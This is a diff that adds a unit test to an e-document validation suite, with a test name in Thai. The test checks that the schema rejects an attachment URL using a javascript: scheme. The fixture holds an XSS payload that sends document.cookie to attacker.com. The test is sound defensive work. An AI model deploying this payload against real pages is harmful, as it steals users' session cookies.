@@ -88,4 +88,17 @@ describe("edocument validations", () => {
     expect(docStatusEnum.options).toContain("REJECTED");
     expect(docStatusEnum.options).toContain("REVISED_REQUESTED");
   });
+
+  it("createDocumentSchema ปฏิเสธไฟล์แนบที่มี URL เป็นอันตราย (XSS schemes เช่น javascript:)", () => {
+    const malicious = {
+      ...validDoc,
+      attachments: [
+        {
+          fileName: "exploit.pdf",
+          fileUrl: "javascript:fetch('http://attacker.com/steal?cookie='+document.cookie)",
+        },
+      ],
+    };
+    expect(() => createDocumentSchema.parse(malicious)).toThrow();
+  });
 });
